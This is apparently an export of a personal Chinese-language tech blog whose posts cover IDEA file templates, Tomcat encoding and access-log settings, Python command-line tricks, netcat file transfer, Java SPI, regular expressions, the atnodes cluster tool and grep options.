<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#set( $email = "xx@xx.com")</span><br><span class="line">#set( $author = "xxx")</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> $&#123;author&#125;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@email</span> $&#123;email&#125;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> $&#123;DATE&#125; $&#123;TIME&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
<p>这个使用的<code>velocity</code>渲染的，可以参考<code>velocity</code>的语法</p>
]]></content>
      
        <categories>
            
            <category> idea </category>
            
        </categories>
        
        
        <tags>
            
            <tag> template </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[tomcat中文编码设置]]></title>
      <url>http://qsli.github.io/2016/12/23/tomcat-encoding/</url>
      <content type="html"><![CDATA[<h2 id="tomcat中文乱码"><a href="#tomcat中文乱码" class="headerlink" title="tomcat中文乱码"></a>tomcat中文乱码</h2><p>tomcat 默认的编<code>ISO-8859-1</code>编码，部分中文会出现乱码</p>
<blockquote>
<p><em>URIEncoding</em><br>This specifies the character encoding used to decode the URI bytes, after %xx decoding the URL. If not specified, ISO-8859-1 will be used.</p>
</blockquote>
<h2 id="编码设置"><a href="#编码设置" class="headerlink" title="编码设置"></a>编码设置</h2><p><code>conf/server.xml</code></p>
<p>修改前：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Connector</span> <span class="attr">port</span>=<span class="string">"8080"</span> <span class="attr">redirectPort</span>=<span class="string">"8443"</span> <span class="attr">connectionTimeout</span>=<span class="string">"20000"</span> <span class="attr">protocol</span>=<span class="string">"HTTP/1.1"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p>修改后：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Connector</span> <span class="attr">port</span>=<span class="string">"8080"</span> <span class="attr">redirectPort</span>=<span class="string">"8443"</span> <span class="attr">connectionTimeout</span>=<span class="string">"20000"</span> </span></span><br><span class="line"><span class="tag"><span class="attr">protocol</span>=<span class="string">"HTTP/1.1"</span>               </span></span><br><span class="line"><span class="tag"><span class="attr">URIEncoding</span>=<span class="string">"UTF-8"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><a href="https://tomcat.apache.org/tomcat-7.0-doc/config/http.html" rel="external nofollow noopener noreferrer" target="_blank">The HTTP Connector</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> tomcat </category>
            
        </categories>
        
        
        <tags>
            
            <tag> encoding </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[tomcat access log 格式设置]]></title>
      <url>http://qsli.github.io/2016/12/23/tomcat-access-log/</url>
      <content type="html"><![CDATA[<h2 id="Tomcat-access-log-日志格式"><a href="#Tomcat-access-log-日志格式" class="headerlink" title="Tomcat access log 日志格式"></a>Tomcat access log 日志格式</h2><p>文件位置: <code>conf/server.xml</code></p>
<p>默认配置</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Access log processes all example.</span></span><br><span class="line"><span class="comment">     Documentation at: /docs/config/valve.html</span></span><br><span class="line"><span class="comment">     <span class="doctag">Note:</span> The pattern used is equivalent to using pattern="common" --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Valve</span> <span class="attr">className</span>=<span class="string">"org.apache.catalina.valves.AccessLogValve"</span> <span class="attr">directory</span>=<span class="string">"logs"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">prefix</span>=<span class="string">"localhost_access_log."</span> <span class="attr">suffix</span>=<span class="string">".txt"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">pattern</span>=<span class="string">"%h %l %u %t <span class="symbol">&amp;quot;</span>%r<span class="symbol">&amp;quot;</span> %s %b"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>名称</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>%a</td>
<td>Remote IP address</td>
</tr>
<tr>
<td>%A</td>
<td>Local IP address</td>
</tr>
<tr>
<td>%b</td>
<td>Bytes sent, excluding HTTP headers, or ‘-‘ if zero</td>
</tr>
<tr>
<td>%B</td>
<td>Bytes sent, excluding HTTP headers</td>
</tr>
<tr>
<td>%h</td>
<td>Remote host name (or IP address if enableLookups for the connector is false)</td>
</tr>
<tr>
<td>%H</td>
<td>Request protocol</td>
</tr>
<tr>
<td>%l</td>
<td>Remote logical username from identd (always returns ‘-‘)</td>
</tr>
<tr>
<td>%m</td>
<td>Request method (GET, POST, etc.)</td>
</tr>
<tr>
<td>%p</td>
<td>Local port on which this request was received</td>
</tr>
<tr>
<td>%q</td>
<td>Query string (prepended with a ‘?’ if it exists)</td>
</tr>
<tr>
<td>%r</td>
<td>First line of the request (method and request URI)</td>
</tr>
<tr>
<td>%s</td>
<td>HTTP status code of the response</td>
</tr>
<tr>
<td>%S</td>
<td>User session ID</td>
</tr>
<tr>
<td>%t</td>
<td>Date and time, in Common Log Format</td>
</tr>
<tr>
<td>%u</td>
<td>Remote user that was authenticated (if any), else ‘-‘</td>
</tr>
<tr>
<td>%U</td>
<td>Requested URL path</td>
</tr>
<tr>
<td>%v</td>
<td>Local server name</td>
</tr>
<tr>
<td>%D</td>
<td>Time taken to process the request, in millis</td>
</tr>
<tr>
<td>%T</td>
<td>Time taken to process the request, in seconds</td>
</tr>
<tr>
<td>%F</td>
<td>Time taken to commit the response, in millis</td>
</tr>
<tr>
<td>%I</td>
<td>Current request thread name (can compare later with stacktraces)</td>
</tr>
</tbody>
</table>
<p>默认的配置打出来的access日志如下：</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>127.0.0.1</td>
<td>-</td>
<td>-</td>
<td>[07/Oct/2016:22:31:56 +0800]</td>
<td>“GET /dubbo/ HTTP/1.1”</td>
<td>404</td>
<td>963</td>
</tr>
<tr>
<td>远程IP</td>
<td>logical username</td>
<td>remote user</td>
<td>时间和日期</td>
<td>http请求的第一行</td>
<td>状态码</td>
<td>除去http头的发送大小</td>
</tr>
</tbody>
</table>
<h3 id="header、cookie、session其他字段的支持"><a href="#header、cookie、session其他字段的支持" class="headerlink" title="header、cookie、session其他字段的支持"></a>header、cookie、session其他字段的支持</h3><blockquote>
<p>There is also support to write information incoming or outgoing headers, cookies, session or request attributes and special timestamp formats. It is modeled after the Apache HTTP Server log configuration syntax:</p>
</blockquote>
<table>
<thead>
<tr>
<th>名称</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>%{xxx}i</td>
<td>for incoming headers</td>
</tr>
<tr>
<td>%{xxx}o</td>
<td>for outgoing response headers</td>
</tr>
<tr>
<td>%{xxx}c</td>
<td>for a specific cookie</td>
</tr>
<tr>
<td>%{xxx}r</td>
<td>xxx is an attribute in the ServletRequest</td>
</tr>
<tr>
<td>%{xxx}s</td>
<td>xxx is an attribute in the HttpSession</td>
</tr>
<tr>
<td>%{xxx}t</td>
<td>xxx is an enhanced SimpleDateFormat pattern</td>
</tr>
</tbody>
</table>
<p>例如： <code>%{X-Forwarded-For}i</code>即可打印出实际访问的ip地址（考虑到ng的反向代理）</p>
<p>HTTP头一般格式如下:</p>
<p><code>X-Forwarded-For: client1, proxy1, proxy2</code></p>
<blockquote>
<p>其中的值通过一个 逗号+空格 把多个IP地址区分开, 最左边（client1）是最原始客户端的IP地址, 代理服务器每成功收到一个请求，就把请求来源IP地址添加到右边。 在上面这个例子中，这个请求成功通过了三台代理服务器：proxy1, proxy2 及 proxy3。请求由client1发出，到达了proxy3（proxy3可能是请求的终点）。请求刚从client1中发出时，XFF是空的，请求被发往proxy1；通过proxy1的时候，client1被添加到XFF中，之后请求被发往proxy2;通过proxy2的时候，proxy1被添加到XFF中，之后请求被发往proxy3；通过proxy3时，proxy2被添加到XFF中，之后请求的的去向不明，如果proxy3不是请求终点，请求会被继续转发。</p>
</blockquote>
<blockquote>
<p>鉴于伪造这一字段非常容易，应该谨慎使用X-Forwarded-For字段。正常情况下XFF中最后一个IP地址是最后一个代理服务器的IP地址, 这通常是一个比较可靠的信息来源。</p>
</blockquote>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><p><a href="http://tomcat.apache.org/tomcat-7.0-doc/config/valve.html" rel="external nofollow noopener noreferrer" target="_blank">The Valve Component</a></p>
</li>
<li><p><a href="https://zh.wikipedia.org/wiki/X-Forwarded-For" rel="external nofollow noopener noreferrer" target="_blank">X-Forwarded-For</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> tomcat </category>
            
        </categories>
        
        
        <tags>
            
            <tag> access-log </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[python 小技巧]]></title>
      <url>http://qsli.github.io/2016/12/18/python-util/</url>
      <content type="html"><![CDATA[<h2 id="开启一个简单的HTTP-Server"><a href="#开启一个简单的HTTP-Server" class="headerlink" title="开启一个简单的HTTP Server"></a>开启一个简单的HTTP Server</h2><ul>
<li>命令：</li>
</ul>
<p><code>python -m SimpleHTTPServer port</code></p>
<p><code>-m</code> 是指后面跟的是python的一个Modlue</p>
<p><code>port</code> 默认是<code>8080</code>，可以自行指定。</p>
<ul>
<li>作用：</li>
</ul>
<ol>
<li><p>可以当一个简单的httpserver，做测试用</p>
</li>
<li><p>可以简单的传输一些小文件（大文件性能不好，经常中断）,大文件的传输可以用nc</p>
</li>
</ol>
<p>见： <a href="/2016/12/18/nc/" title="netcat(nc) —— 使用小结">netcat(nc) —— 使用小结</a></p>
<h2 id="简单的cig-server"><a href="#简单的cig-server" class="headerlink" title="简单的cig server"></a>简单的cig server</h2><ul>
<li><p>命令：<br><code>python -m CGIHTTPServer port</code></p>
</li>
<li><p>作用:</p>
</li>
</ul>
<p>可以开启一个简单的cgi服务器，支持python作为cgi的语言，cgi的脚本须放置在root目录下的<code>cgi-bin</code></p>
<h2 id="格式化-json数据"><a href="#格式化-json数据" class="headerlink" title="格式化 json数据"></a>格式化 json数据</h2><ul>
<li>命令:</li>
</ul>
<p><code>curl http://my_url/ | python -m json.tool</code></p>
<ul>
<li>作用:</li>
</ul>
<p>在返回大量json数据时，在命令行里可以用这个工具进行格式化。</p>
<p>chrome浏览器中的<code>JsonView</code>插件可以做到同样的事情<a href="https://chrome.google.com/webstore/detail/json-viewer/aimiinbnnkboelefkjlenlgimcabobli?utm_source=chrome-ntp-icon" rel="external nofollow noopener noreferrer" target="_blank">chrome商店链接</a></p>
<ul>
<li>缺陷：</li>
</ul>
<p>python 2.x 中是使用ASCII码作为默认编码的，因此json中如果带有中文就只是16进制的表示，可以修改<code>json.tool</code>的源代码。</p>
<p>参见<a href="http://axiaoxin.com/article/77/" rel="external nofollow noopener noreferrer" target="_blank">json处理小技巧</a></p>
<blockquote>
<p>Python也有命令行里面格式化显示json的模块json.tool</p>
</blockquote>
<blockquote>
<p>cat data.json<br>{“爱”: “我”, “中”: “华”}<br>cat data.json| python -m json.tool<br>{<br>    “\u4e2d”: “\u534e”,<br>    “\u7231”: “\u6211”<br>}<br>好像有什么不对劲？因为json.tool在实现的时候ensure_ascii为True，让我们用Python来自己实现一个更好的Unix filter。</p>
</blockquote>
<p><code>filter.py</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> fileinput</span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> fileinput.input():</span><br><span class="line">    print(json.dumps(json.loads(l), ensure_ascii=<span class="literal">False</span>).encode(<span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure>
<p>只需要写上面那 4 行代码，就可以这样使用它：</p>
<blockquote>
<p>python filter.py data.json<br>{“爱”: “我”, “中”: “华”}<br>cat data.json| python filter.py<br>{“爱”: “我”, “中”: “华”}</p>
</blockquote>
<h2 id="编码问题"><a href="#编码问题" class="headerlink" title="编码问题"></a>编码问题</h2><p>python 2.x 默认使用的编码是ascii编码，中文总是出问题。</p>
<p>遇到乱码问题，一般使用如下的步骤即可解决:</p>
<ol>
<li>python文件自身的编码</li>
</ol>
<blockquote>
<pre><code>Python will default to ASCII as standard encoding if no other
encoding hints are given.
</code></pre></blockquote>
<pre><code>To define a source code encoding, a magic comment must
be placed into the source files either as first or second
line in the file, such as:

      # coding=&lt;encoding name&gt;

or (using formats recognized by popular editors)

      #!/usr/bin/python
      # -*- coding: &lt;encoding name&gt; -*-
</code></pre><p>在文件头加上默认编码即可：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/bin/python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> os, sys</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>重新设置系统模块的编码</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.setdefaultencoding(<span class="string">'utf-8'</span>)</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>使用Unicode</li>
</ol>
<p><code>s = u&#39;中文&#39;</code> </p>
<h2 id="to-be-continued"><a href="#to-be-continued" class="headerlink" title="to be continued"></a>to be continued</h2><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li><a href="https://www.python.org/dev/peps/pep-0263/" rel="external nofollow noopener noreferrer" target="_blank">Defining Python Source Code Encodings</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> python </category>
            
        </categories>
        
        
        <tags>
            
            <tag> python-util </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[netcat(nc) —— 使用小结]]></title>
      <url>http://qsli.github.io/2016/12/18/nc/</url>
      <content type="html"><![CDATA[<p>nc的全称是netcat，提供了许多关于网络操作的功能，号称网络工具中的瑞士军刀。</p>
<p>nc也有windows的移植版本：<a href="https://eternallybored.org/misc/netcat/" rel="external nofollow noopener noreferrer" target="_blank"></a></p>
<blockquote>
<p>  Netcat is a featured networking utility which reads and writes data across network connections, using the TCP/IP protocol.<br>It is designed to be a reliable “back-end” tool that can be used directly or easily driven by other programs and scripts. At the same time, it is a feature-rich network debugging and exploration tool, since it can create almost any kind of connection you would need and has several interesting built-in capabilities.</p>
</blockquote>
<h2 id="常见用途"><a href="#常见用途" class="headerlink" title="常见用途"></a>常见用途</h2><h3 id="nc-传输文件："><a href="#nc-传输文件：" class="headerlink" title="nc 传输文件："></a>nc 传输文件：</h3><ul>
<li>传送文件</li>
</ul>
<p>发送端：<code>nc -l 6666 &lt; file</code><br>接收端: <code>nc host 6666 | pv -L 30m &gt; wrapper</code></p>
<p>其中pv是一个限流的工具。</p>
<ul>
<li>压缩传输一个文件夹</li>
</ul>
<p><code>tar zcvf folder.tar.gz folder | nc -l 6666</code></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol>
<li><a href="http://netcat.sourceforge.net/" rel="external nofollow noopener noreferrer" target="_blank">The GNU Netcat</a></li>
<li><a href="https://www.oschina.net/translate/linux-netcat-command" rel="external nofollow noopener noreferrer" target="_blank">Linux Netcat 命令——网络工具中的瑞士军刀</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> shell </category>
            
        </categories>
        
        
        <tags>
            
            <tag> netcat </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Java SPI 总结]]></title>
      <url>http://qsli.github.io/2016/12/17/spi/</url>
      <content type="html"><![CDATA[<h2 id="SPI-ABC"><a href="#SPI-ABC" class="headerlink" title="SPI ABC"></a>SPI ABC</h2><p>SPI 代表<code>Service Provider Interfaces</code>, 是一种服务提供发现的机制。JDK中为其提供了<code>ServiceLoader</code>用来加载接口对应的实现。</p>
<h2 id="使用约定"><a href="#使用约定" class="headerlink" title="使用约定"></a>使用约定</h2><img src="/2016/12/17/spi/usage.jpg" title="使用约定">
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">└── src</span><br><span class="line">├── com</span><br><span class="line">│   └── ivanzhang</span><br><span class="line">│       └── spi</span><br><span class="line">│           ├── HelloInterface.java</span><br><span class="line">│           ├── impl</span><br><span class="line">│           │   ├── ImageHello.java</span><br><span class="line">│           │   └── TextHello.java</span><br><span class="line">│           └── SPIMain.java</span><br><span class="line">└── META-INF</span><br><span class="line">    └── services</span><br><span class="line">        └── com.ivanzhang.spi.HelloInterface</span><br></pre></td></tr></table></figure>
<h2 id="使用例子"><a href="#使用例子" class="headerlink" title="使用例子"></a>使用例子</h2><ul>
<li>common-logging</li>
</ul>
<blockquote>
<p>common-logging，apache最早提供的日志的门面接口。只有接口，没有实现。具体方案由各提供商实现，发现日志提供商是通过扫描 META-INF/services/org.apache.commons.logging.LogFactory配置文件，通过读取该文件的内容找到日志提工商实现类。只要我们的日志实现里包含了这个文件，并在文件里制定 LogFactory工厂接口的实现类即可。</p>
</blockquote>
<ul>
<li>jdbc</li>
</ul>
<blockquote>
<p>jdbc4.0以前，开发还需要基于Class.forName(“xxx”)的方式来装载驱动，jdbc4也基于spi的机制来发现驱动提供商了，可以通过META-INF/services/java.sql.Driver文件里指定实现类的方式来暴露驱动提供者。</p>
</blockquote>
<p><em>其他用途：</em></p>
<ul>
<li>Java Database Connectivity</li>
<li>Java Cryptography Extension</li>
<li>Java Naming and Directory Interface</li>
<li>Java API for XML Processing</li>
<li>Java Business Integration</li>
<li>Java Sound</li>
<li>Java Image I/O</li>
<li>Java File Systems</li>
</ul>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><p><a href="http://www.solinx.co/archives/142" rel="external nofollow noopener noreferrer" target="_blank">Java的SPI机制与简单示例</a></p>
</li>
<li><p><a href="https://my.oschina.net/u/1034176/blog/659445" rel="external nofollow noopener noreferrer" target="_blank">Java SPI机制简介 - oschina</a></p>
</li>
<li><p><a href="http://ivanzhangwb.github.io/blog/2012/06/01/java-spi/" rel="external nofollow noopener noreferrer" target="_blank">Java SPI机制简介 - 技术宅</a></p>
</li>
<li><p><a href="https://docs.oracle.com/javase/tutorial/sound/SPI-intro.html" rel="external nofollow noopener noreferrer" target="_blank">Introduction to the Service Provider Interfaces</a></p>
</li>
<li><p><a href="http://www.jianshu.com/p/bd36c023ddf0" rel="external nofollow noopener noreferrer" target="_blank">谈java SPI机制、spring-mvc启动及servlet3.0</a></p>
</li>
<li><p><a href="https://en.wikipedia.org/wiki/Service_provider_interface" rel="external nofollow noopener noreferrer" target="_blank">Service Provider Interface</a></p>
</li>
<li><p><a href="http://resources.sei.cmu.edu/asset_files/TechnicalNote/2002_004_001_13958.pdf" rel="external nofollow noopener noreferrer" target="_blank">Replaceable Components and the Service Provider Interface </a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> spi </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[正则总结]]></title>
      <url>http://qsli.github.io/2016/12/14/re/</url>
      <content type="html"><![CDATA[<h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><p>推荐使用<code>RegexBudy</code></p>
<p><img src="https://www.regexbuddy.com/img/icon.png" alt></p>
<p>界面如下:</p>
<p><img src="https://www.regexbuddy.com/screens/regexbuddy.png" alt></p>
<p>推荐python的 <code>VerbalExpressions</code> <a href="https://github.com/VerbalExpressions/PythonVerbalExpressions" rel="external nofollow noopener noreferrer" target="_blank">PythonVerbalExpressions </a></p>
<h1 id="使用心得"><a href="#使用心得" class="headerlink" title="使用心得"></a>使用心得</h1><h2 id="匹配多个单词"><a href="#匹配多个单词" class="headerlink" title="匹配多个单词"></a>匹配多个单词</h2><p><code>\b</code>可以匹配一个单词的开头或者结尾</p>
<p>匹配单个单词： <code>\bfoo\b</code> 可以匹配单个单测 foo</p>
<p>匹配多个单词： <code>\b(foo|bar)\b</code> 可以匹配foo 或者 bar</p>
<h2 id="匹配开头和结尾"><a href="#匹配开头和结尾" class="headerlink" title="匹配开头和结尾"></a>匹配开头和结尾</h2><p><code>^</code>可以匹配字符串的开头</p>
<p><code>$</code>可以匹配字符串的结尾</p>
<h2 id="零宽断言"><a href="#零宽断言" class="headerlink" title="零宽断言"></a>零宽断言</h2><table>
<thead>
<tr>
<th>分类</th>
<th>代码/语法</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>捕获</td>
<td>(exp)</td>
<td>匹配exp,并捕获文本到自动命名的组里</td>
</tr>
<tr>
<td></td>
<td>(?<name>exp)</name></td>
<td>匹配exp,并捕获文本到名称为name的组里，也可以写成(?’name’exp)</td>
</tr>
<tr>
<td></td>
<td>(?:exp)</td>
<td>匹配exp,不捕获匹配的文本，也不给此分组分配组号</td>
</tr>
<tr>
<td>零宽断言</td>
<td>(?=exp) 匹配exp前面的位置</td>
</tr>
<tr>
<td></td>
<td>(?&lt;=exp)</td>
<td>匹配exp后面的位置</td>
</tr>
<tr>
<td></td>
<td>(?!exp)</td>
<td>匹配后面跟的不是exp的位置</td>
</tr>
<tr>
<td></td>
<td>(?&lt;!exp)</td>
<td>匹配前面不是exp的位置</td>
</tr>
<tr>
<td>注释  (?#comment)</td>
<td>这种类型的分组不对正则表达式的处理产生任何影响，用于提供注释让人阅读</td>
</tr>
</tbody>
</table>
<h3 id="先行断言"><a href="#先行断言" class="headerlink" title="先行断言"></a>先行断言</h3><p>语法格式</p>
<p><code>[a-z]*(?=ing)</code></p>
<p>可匹配 cooking singing 中的cook 与 sing</p>
<h3 id="后发断言"><a href="#后发断言" class="headerlink" title="后发断言"></a>后发断言</h3><p>语法格式</p>
<p><code>(?&lt;=abc)[a-z]*</code></p>
<p>可匹配 abcdefg 中的defg</p>
<h3 id="负向零宽断言"><a href="#负向零宽断言" class="headerlink" title="负向零宽断言"></a>负向零宽断言</h3><p>语法格式</p>
<p><code>(?!exp)</code></p>
<p>断言此位置的后面不能匹配表达式<code>exp</code></p>
<p><code>\b\w*q(?!u)\w*\b</code> 匹配q后面不出现u（可以以q结尾）</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li><p><a href="https://www.regexbuddy.com/" rel="external nofollow noopener noreferrer" target="_blank">RegexBuddy官网</a></p>
</li>
<li><p><a href="https://luke0922.gitbooks.io/learnregularexpressionin30minutes/content/" rel="external nofollow noopener noreferrer" target="_blank">正则表达式30分钟入门教程</a></p>
</li>
<li><p><a href="http://www.biliyu.com/article/1321.html" rel="external nofollow noopener noreferrer" target="_blank">正则表达式怎样匹配多个单词</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> base </category>
            
        </categories>
        
        
        <tags>
            
            <tag> re </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[atnode——在集群上批量执行命令]]></title>
      <url>http://qsli.github.io/2016/12/13/atnode/</url>
      <content type="html"><![CDATA[<h2 id="atnodes"><a href="#atnodes" class="headerlink" title="atnodes"></a>atnodes</h2><p>atnode是一个用perl写成的工具，它可以方便的在集群上执行命令</p>
<p><a href="http://search.cpan.org/~agent/SSH-Batch-0.029/bin/atnodes" rel="external nofollow noopener noreferrer" target="_blank">官网链接</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">atnodes <span class="string">"echo alias grep=\'grep -n --color\' &gt;&gt; ~/.bashrc "</span>  xxx.xx[1-10].com  yyy.yy[1-10].com</span><br></pre></td></tr></table></figure>
<p>上述的命令就会在后面两个列表的主机上都执行一遍了。</p>
<h2 id="tonodes"><a href="#tonodes" class="headerlink" title="tonodes"></a>tonodes</h2><p>与atnodes类似，tonodes 可以将文件传输到集群上的没一个文件</p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>fornodes: Expand patterns to machine host list</p>
<p>key2nodes: Push SSH public keys to remote clusters </p>
<h2 id="作者博客"><a href="#作者博客" class="headerlink" title="作者博客"></a>作者博客</h2><p><a href="http://weibo.com/u/1834459124?topnav=1&amp;wvr=6&amp;topsug=1&amp;is_all=1" rel="external nofollow noopener noreferrer" target="_blank">agentzh的微博</a></p>
]]></content>
      
        <categories>
            
            <category> shell </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[grep 总结]]></title>
      <url>http://qsli.github.io/2016/12/07/grep/</url>
      <content type="html"><![CDATA[<h2 id="常见用法"><a href="#常见用法" class="headerlink" title="常见用法"></a>常见用法</h2><p>示例文本：</p>
<blockquote>
<p>“Night gathers, and now my watch begins. It shall not end<br>until my death. I shall take no wife, hold no lands, father no<br>children. I shall wear no crowns and win no glory. I shall live<br>and die at my post. I am the sword in the darkness. I am the<br>watcher on the walls. I am the shield that guards the realms of<br>men. I pledge my life and honor to the Night’s Watch, for this<br>night and all the nights to come.”</p>
</blockquote>
<h3 id="grep-39-keyword-39-filename"><a href="#grep-39-keyword-39-filename" class="headerlink" title="grep &#39;keyword&#39; filename"></a><code>grep &#39;keyword&#39; filename</code></h3><p>在一个文件按照关键字查找</p>
<p> <code>grep &#39;now&#39; test.txt</code> 输出</p>
<blockquote>
<p>“Night gathers, and now my watch begins. It shall not end</p>
</blockquote>
<h3 id="grep-n"><a href="#grep-n" class="headerlink" title="grep -n"></a><code>grep -n</code></h3><p>显示行号</p>
<p> <code>grep -n &#39;now&#39; test.txt</code> 输出</p>
<blockquote>
<p>1:”Night gathers, and now my watch begins. It shall not end</p>
</blockquote>
<h3 id="grep-i"><a href="#grep-i" class="headerlink" title="grep -i"></a><code>grep -i</code></h3><p>忽略大小写</p>
<p> <code>grep -i &#39;watch&#39; test.txt</code> 输出</p>
<blockquote>
<p>“Night gathers, and now my watch begins. It shall not end<br>watcher on the walls. I am the shield that guards the realms of<br>men. I pledge my life and honor to the Night’s Watch, for this</p>
</blockquote>
<h3 id="grep-v"><a href="#grep-v" class="headerlink" title="grep -v"></a><code>grep -v</code></h3><p>输出不包含 <code>-v</code> 后面关键字的行</p>
<p><code>grep -v &#39;watch&#39; test.txt</code> 输出</p>
<blockquote>
<p>until my death. I shall take no wife, hold no lands, father no<br>children. I shall wear no crowns and win no glory. I shall live<br>and die at my post. I am the sword in the darkness. I am the<br>men. I pledge my life and honor to the Night’s Watch, for this<br>night and all the nights to come.”</p>
</blockquote>
<h3 id="grep-e"><a href="#grep-e" class="headerlink" title="grep -e"></a><code>grep -e</code></h3><p>提供正则的支持，关键字中可以包含正则表达式</p>
<h3 id="grep-B10"><a href="#grep-B10" class="headerlink" title="grep -B10"></a><code>grep -B10</code></h3><p>输出匹配行的同事， 也输出匹配行之前的10行（before）</p>
<h3 id="grep-A10"><a href="#grep-A10" class="headerlink" title="grep -A10"></a><code>grep -A10</code></h3><p>输出匹配行的同时，也输出匹配行之后的10行（after）</p>
<h3 id="grep-C10"><a href="#grep-C10" class="headerlink" title="grep -C10"></a><code>grep -C10</code></h3><p>输出匹配行的同时，输出之前和之后的10行</p>
<h3 id="grep-o"><a href="#grep-o" class="headerlink" title="grep -o"></a><code>grep -o</code></h3><p>只输出匹配的内容</p>
<p><code>grep -o &#39;watch&#39; test.txt</code></p>
<blockquote>
<p>watch<br>  watch</p>
</blockquote>
<h3 id="grep-c"><a href="#grep-c" class="headerlink" title="grep -c"></a><code>grep -c</code></h3><p>输出匹配的行数的个数</p>
<p><code>grep -ci &#39;watch&#39; test.txt</code></p>
<blockquote>
<p>3</p>
</blockquote>
<h2 id="grep-P"><a href="#grep-P" class="headerlink" title="grep -P"></a><code>grep -P</code></h2><p>支持Perl style的正则表达式</p>
<blockquote>
<p>-P, –perl-regexp<br> Interpret PATTERN as a Perl regular expression.  This is highly experimental and grep -P may warn of  unimplemented<br> features.</p>
</blockquote>
<h3 id="零宽断言"><a href="#零宽断言" class="headerlink" title="零宽断言"></a>零宽断言</h3><h2 id="捕获组"><a href="#捕获组" class="headerlink" title="捕获组"></a>捕获组</h2><h3 id="grep-l"><a href="#grep-l" class="headerlink" title="grep -l"></a><code>grep -l</code></h3><p>显示有匹配行的文件，只显示文件名称，不显示内容</p>
<p><code>grep -l &#39;watch&#39; test.txt</code></p>
<blockquote>
<p>test.txt</p>
</blockquote>
